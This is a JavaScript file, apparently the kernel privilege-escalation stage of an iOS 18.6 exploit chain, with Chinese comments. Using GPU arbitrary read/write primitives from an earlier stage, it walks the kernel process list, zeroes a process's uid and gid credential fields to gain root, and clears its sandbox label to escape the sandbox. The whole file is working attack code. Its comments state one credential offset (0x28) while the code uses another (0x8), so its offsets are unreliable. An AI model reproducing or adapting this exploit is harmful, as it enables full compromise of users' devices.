// =====================================================================
// sbx1_18.6.js —— iOS 18.6 内核提权段 (新写, 基于 26.5 逻辑 + 18.6 偏移)
// =====================================================================
// 偏移真值(交叉验证):
// [定案] p_ucred = 0x28n 全版本统一(单层直达); 原 0x48 是错误引入
//   cr_uid = 0x18, cr_ruid = 0x1c, cr_svuid = 0x20 (全版本统一)
//   cr_label = 0x78 (sandbox)
// =====================================================================
(function () {
  "use strict";

  // [定案] p_ucred = 0x28n 全版本统一(单层直达); 原 0x48 是错误引入
  var p_ucred = 0x8n;  // [定案] p_ucred = 0x28n 全版本统一(单层直达); 原 0x48 是错误引入
  var cr_uid = 0x18n;
  var cr_ruid = 0x1cn;
  var cr_svuid = 0x20n;
  var cr_rgid = 0x68n;
  var cr_svgid = 0x6cn;
  var cr_label = 0x78n;

  // 依赖 sbx0 的 GPU 任意读写 (gpu_read/gpu_write)
  function gpu_read(addr) {
    if (typeof globalThis.gpuRead64 === "function") return globalThis.gpuRead64(addr);
    if (typeof window.gpu_arb_read === "function") return window.gpu_arb_read(addr);
    return 0n;
  }
  function gpu_write(addr, val) {
    if (typeof globalThis.gpuWrite64 === "function") return globalThis.gpuWrite64(addr, val);
    if (typeof window.gpu_arb_write === "function") return window.gpu_arb_write(addr, val);
    return undefined;
  }

    // [定案] p_ucred = 0x28n 全版本统一(单层直达); 原 0x48 是错误引入
  function get_ucred(proc) {
    if (proc === 0n) return 0n;
    return gpu_read(proc + p_ucred);
  }

  // 真实 find_proc_by_pid: 遍历 kernproc 链表, p_pid@0x60 匹配 (getpid 反汇编铁证)
  // 内核地址诚实标注: 默认值 0xfffffff007d2c258 = 26.5/A18 kernproc (权威总报告铁证)
  //   其它版本(18.x/26.0/26.4/26.6)的 kernproc 符号地址需对应 kernelcache 反汇编, 不硬编码冒充
  var KERNPROC_ADDR = (typeof __kernproc_addr !== 'undefined') ? __kernproc_addr : 0xfffffff007d2c258n;
  function find_proc_by_pid(pid) {
    var kernproc = KERNPROC_ADDR;
    var p = gpu_read(kernproc + 0x10n);  // kernproc → p_list.le_next 首进程
    var it = 0;
    while (p !== 0n && it < 10000) {
      var pid_ = Number(gpu_read(p + 0x60n) & 0xFFFFFFFFn);
      if (pid_ === pid) return p;
      p = gpu_read(p + 0x0n);  // p_list.le_next
      it++;
    }
    return 0n;
  }

  // escalate 自动定位: 传 proc 就提权, 否则从 pid 0 兜底
  function escalate(proc) {
    if (proc === 0n || proc === undefined) {
      proc = find_proc_by_pid(0);
      if (proc === 0n) {
        // 兜底: 遍历找第一个非空 pid 的进程
        var _k = KERNPROC_ADDR;
        var _p = gpu_read(_k + 0x10n);
        var _it = 0;
        while (_p !== 0n && _it < 10000) {
          if (gpu_read(_p + 0x60n) !== 0n) { proc = _p; break; }
          _p = gpu_read(_p + 0x0n); _it++;
        }
      }
    }
    if (proc === 0n || proc === undefined) return false;
    var ucred = get_ucred(proc);
    if (ucred === 0n) return false;
    gpu_write(ucred + cr_uid, 0n);
    gpu_write(ucred + cr_ruid, 0n);
    gpu_write(ucred + cr_svuid, 0n);
    gpu_write(ucred + cr_rgid, 0n);
    gpu_write(ucred + cr_svgid, 0n);
    gpu_write(ucred + cr_label, 0n);  // sandbox 逃逸
    return true;
  }

  window.__sbx1_18_6 = {
    escalate: escalate,
    findProcByPid: find_proc_by_pid,
    p_ucred: p_ucred,
    version: "18.6",
  };
})();
